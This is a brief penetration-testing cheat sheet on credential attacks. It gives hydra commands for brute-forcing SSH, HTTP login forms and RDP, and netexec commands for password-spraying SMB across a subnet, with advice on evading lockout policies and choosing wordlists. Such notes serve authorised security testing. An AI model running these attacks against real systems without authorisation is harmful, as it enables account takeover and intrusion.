# 10.03 Service Brute-Force hydra netexec

> Brute SSH/FTP/HTTP/RDP with `hydra` and spray SMB/WinRM/WMI with `netexec` — always check lockout policy first.

## Overview

hydra brute-forces SSH/FTP/HTTP/RDP. nxc/netexec spray Windows SMB/WinRM/WMI. Always check for lockout policies first.

## Steps

- **Validate one credential first** — netexec smb null session for policy.
- **Spray, don't brute** — one or two passwords across many users.
- **Mind lockout** — usually 5 attempts in 30 minutes.
- **Pick wordlists** — rockyou + seasonal patterns.

## Commands

### hydra examples

```bash
hydra -L users.txt -P pass.txt ssh://<TARGET>
hydra -l admin -P pass.txt <TARGET> http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'
hydra -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<TARGET>
```

### netexec password spray

```bash
netexec smb <TARGET>/24 -u users.txt -p 'Spring2026!'
netexec smb <TARGET> -u <USER> -p pass.txt --continue-on-success
```
